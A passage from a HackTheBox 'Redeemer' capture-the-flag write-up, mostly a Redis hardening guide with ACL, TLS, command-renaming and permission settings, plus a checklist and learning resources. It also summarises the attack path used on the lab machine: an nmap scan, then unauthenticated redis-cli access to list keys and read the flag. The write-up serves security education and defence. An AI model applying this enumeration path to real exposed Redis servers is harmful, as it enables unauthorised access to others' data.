ACL SETUSER readonly on >readonlypassword ~cached:* +get +mget +info

# Explanation:
# on = enabled
# >password = set password
# ~cached:* = only access keys matching "cached:*"
# +get +mget +info = only allow these commands

# Create admin user
ACL SETUSER admin on >adminpassword ~* +@all

# List users
ACL LIST

# Save to disk
ACL SAVE

# Configure in redis.conf
user readonly on >readonlypassword ~cached:* +get +mget
user admin on >adminpassword ~* +@all
```

---

**8. Enable Persistence with Proper Permissions**
```bash
# Edit redis.conf
dir /var/lib/redis
dbfilename dump.rdb
appendonly yes
appendfilename "appendonly.aof"

# Set restrictive permissions
sudo chown redis:redis /var/lib/redis
sudo chmod 700 /var/lib/redis
sudo chmod 600 /var/lib/redis/dump.rdb
sudo chmod 600 /var/lib/redis/appendonly.aof
```

---

**9. Disable Dangerous Modules**
```bash
# Edit redis.conf (Redis 4.0+)
# Prevent loading external modules
enable-module-command no
```

---

**10. Run Redis as Non-Root User**
```bash
# Create dedicated redis user
sudo useradd -r -s /bin/false redis

# Edit redis.conf
user redis
supervised systemd

# Update systemd service
sudo vi /etc/systemd/system/redis.service

[Service]
User=redis
Group=redis

# Restart
sudo systemctl daemon-reload
sudo systemctl restart redis
```

---

### Monitoring and Logging (Medium Priority)

**11. Enable Command Logging**
```bash
# Edit redis.conf
slowlog-log-slower-than 10000   # Log commands slower than 10ms
slowlog-max-len 128             # Keep last 128 slow commands

# Check slow log
SLOWLOG GET 10
```

---

**12. Monitor Failed Authentication Attempts**
```bash
# Enable syslog
syslog-enabled yes
syslog-ident redis

# Check logs
sudo tail -f /var/log/syslog | grep redis
```

---

**13. Set Memory Limits**
```bash
# Edit redis.conf
maxmemory 2gb                   # Limit Redis to 2GB
maxmemory-policy allkeys-lru    # Evict least recently used keys

# Monitor memory
INFO memory
```

---

**14. Configure Client Limits**
```bash
# Edit redis.conf
maxclients 10000                # Max simultaneous connections
timeout 300                     # Close idle connections after 5 min
tcp-keepalive 300              # TCP keepalive packets
```

---

### Hardened Redis Configuration Example

**Complete Secure redis.conf:**
```conf
# Network
bind 127.0.0.1 ::1
protected-mode yes
port 0
tls-port 6379
tls-cert-file /etc/redis/certs/redis.crt
tls-key-file /etc/redis/certs/redis.key
tls-ca-cert-file /etc/redis/certs/ca.crt

# Authentication
requirepass dJ8$mK9!pL2@nQ5^rT7&vX1#wY3*zB6%cF4

# Access Control (Redis 6.0+)
aclfile /etc/redis/users.acl

# Persistence
dir /var/lib/redis
dbfilename dump.rdb
appendonly yes
appendfilename "appendonly.aof"

# Resource Limits
maxmemory 2gb
maxmemory-policy allkeys-lru
maxclients 10000
timeout 300

# Command Renaming
rename-command FLUSHDB ""
rename-command FLUSHALL ""
rename-command CONFIG "CONFIG_a8f5b2d9c3e7"
rename-command SHUTDOWN ""
rename-command DEBUG ""
rename-command MODULE ""
rename-command KEYS "KEYS_x9k2m4n8"

# Logging
loglevel notice
logfile /var/log/redis/redis.log
syslog-enabled yes

# Slow Log
slowlog-log-slower-than 10000
slowlog-max-len 128

# Process
supervised systemd
user redis
```

---

### Verification Steps

**Test Security Configuration:**
```bash
# 1. Verify external access is blocked
redis-cli -h PUBLIC_IP
# Should: Connection refused or timeout

# 2. Verify authentication is required
redis-cli -h localhost
> PING
# Should: (error) NOAUTH Authentication required

# 3. Verify dangerous commands are disabled
> AUTH YourPassword
> FLUSHALL
# Should: (error) ERR unknown command

# 4. Check listening interfaces
sudo netstat -tlnp | grep redis
# Should: 127.0.0.1:6379 (NOT 0.0.0.0:6379)

# 5. Verify file permissions
ls -la /var/lib/redis
# Should: drwx------ redis redis (700)

# 6. Test ACLs (Redis 6.0+)
ACL LIST
# Should: Show configured users with limited permissions
```

---

### Security Checklist

Before deploying Redis to production:

- [ ] **Authentication enabled** (requirepass set)
- [ ] **Bind to localhost** or internal IP only
- [ ] **Protected mode enabled**
- [ ] **Firewall rules** restrict access to trusted IPs
- [ ] **TLS encryption enabled** (Redis 6.0+ recommended)
- [ ] **Dangerous commands renamed** or disabled
- [ ] **ACLs configured** with principle of least privilege (Redis 6.0+)
- [ ] **Running as non-root** user
- [ ] **Persistence enabled** with proper permissions
- [ ] **Memory limits** configured
- [ ] **Logging enabled** for audit trail
- [ ] **Regular backups** automated
- [ ] **Monitoring alerts** for unauthorized access
- [ ] **Updates applied** (latest stable Redis version)

---

## 📚 Learning Resources

### Official Documentation
- [Redis Official Documentation](https://redis.io/documentation)
- [Redis Commands Reference](https://redis.io/commands)
- [Redis Security Guidelines](https://redis.io/topics/security)
- [Redis Best Practices](https://redis.io/topics/best-practices)

### Books
- **Redis in Action** by Josiah L. Carlson
- **The Little Redis Book** by Karl Seguin (Free)
- **Redis Essentials** by Maxwell Dayvson Da Silva

### Online Courses
- [Redis University](https://university.redis.com/) - Free official courses
- [Try Redis](https://try.redis.io/) - Interactive Redis tutorial
- [Redis Labs Training](https://redis.com/redis-enterprise/training/)

### Tools
- **RedisInsight** - GUI for Redis (official)
- **Redis Desktop Manager** - Cross-platform Redis GUI
- **redis-cli** - Command-line interface (included with Redis)
- **redis-benchmark** - Performance testing tool

### Security Resources
- [OWASP Redis Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Redis_Security_Cheat_Sheet.html)
- [Redis Security Checklist](https://redis.io/topics/security)
- [CVE Database - Redis](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=redis)

---

## 🎓 Key Takeaways

### Technical Skills Acquired

✅ **Redis Fundamentals**
- Understanding Redis architecture and use cases
- Learning Redis command syntax and data types
- Navigating multiple Redis databases

✅ **Network Reconnaissance**
- Identifying services by port number (6379 = Redis)
- Service version detection with nmap
- Protocol-specific enumeration

✅ **Database Enumeration**
- Connecting to Redis with redis-cli
- Using INFO command for server intelligence
- Enumerating databases and keys

✅ **Data Extraction**
- Selecting databases with SELECT
- Listing keys with KEYS command
- Retrieving values with GET

✅ **Security Analysis**
- Identifying authentication vulnerabilities
- Understanding attack vectors for NoSQL databases
- Recognizing dangerous Redis misconfigurations

---

### Security Lessons Learned

🔒 **Authentication is Critical**
- Default installations often lack authentication
- Always enable `requirepass` in production
- Use strong, randomly generated passwords

🔒 **Network Exposure is Dangerous**
- Never bind to 0.0.0.0 without authentication
- Use firewall rules to restrict access
- Bind to localhost for local-only services

🔒 **Defense in Depth**
- Authentication + Firewall + TLS + ACLs
- Disable or rename dangerous commands
- Run services with least privilege

🔒 **Default = Insecure**
- Default configurations prioritize ease over security
- Always harden services before production deployment
- Regularly audit configurations for misconfigurations

---

### Practical Applications

**Where You'll Use These Skills:**

1. **Penetration Testing**
   - Enumerating Redis instances during network scans
   - Exploiting misconfigured databases
   - Demonstrating risk to clients

2. **Security Auditing**
   - Identifying insecure Redis deployments
   - Verifying compliance with security policies
   - Recommending remediation strategies

3. **Incident Response**
   - Investigating compromised Redis servers
   - Analyzing attack patterns
   - Recovering from data breaches

4. **DevOps/System Administration**
   - Hardening Redis in production environments
   - Implementing monitoring and alerting
   - Creating secure deployment pipelines

---

## 🏆 Next Steps

### Recommended Learning Path

**1. Continue Starting Point Tier 0**
- ✅ Meow (Telnet)
- ✅ Fawn (FTP)
- ✅ Dancing (SMB)
- ✅ Redeemer (Redis)
- 🎯 Explosion (RDP)
- 🎯 Preignition (Web)
- 🎯 Mongod (MongoDB)
- 🎯 Synced (Rsync)

**2. Practice Similar Skills**
- TryHackMe: Redis (similar vulnerable Redis machine)
- VulnHub: DC-1 (includes Redis exploitation)
- HackTheBox: Postman (Redis + Webmin)

**3. Deep Dive into Topics**
- **NoSQL Databases**: MongoDB, CouchDB, Cassandra
- **Redis Advanced Features**: Pub/Sub, Streams, Lua scripting
- **Database Security**: SQL injection, NoSQL injection
- **Caching Strategies**: Redis as cache layer

**4. Expand Tool Knowledge**
- **Database Clients**: mongo, cqlsh, psql
- **Enumeration**: nuclei templates, shodan
- **Exploitation**: Metasploit modules for Redis

---

## 📝 Summary

**Redeemer** demonstrates the critical importance of securing database services. This machine teaches that:

- Default configurations are often insecure
- NoSQL databases like Redis require authentication
- Network services should never be exposed without protection
- Enumeration is methodical: port → service → version → exploitation
- Defense in depth (authentication + firewall + encryption) is essential

**Flag obtained from:** Unsecured Redis database, key "flag" in database 0

**Attack Path:**
```
nmap scan → Redis on port 6379 → No authentication → SELECT 0 → KEYS * → GET flag
```

**Vulnerability:** Unauthenticated Redis access (CWE-306)

**Remediation:** Enable requirepass, bind to localhost, implement firewall rules

---

<div align="center">

**🔒 Always Secure Your Databases. Defense in Depth Wins.**

**Completed:** 05 January 2026 | **Player Rank:** #286759

[← Back to Starting Point](../) | [Next Machine: Explosion →](../Explosion/)

</div>

---

## ⚖️ Disclaimer

This writeup is for **educational purposes only**. All techniques demonstrated are performed on authorized HackTheBox lab machines. Unauthorized access to computer systems is illegal.

**Flags are intentionally redacted** to encourage learning the methodology rather than copying answers. Focus on understanding the reconnaissance, enumeration, and exploitation process.

Always obtain explicit permission before testing security on systems you do not own.

---

**Author:** Salim Hadda  
**Platform:** HackTheBox  
**Machine:** Redeemer (Starting Point - Tier 0)  
**Date:** 05 January 2026  
**Status:** ✅ Pwned - Player #286759
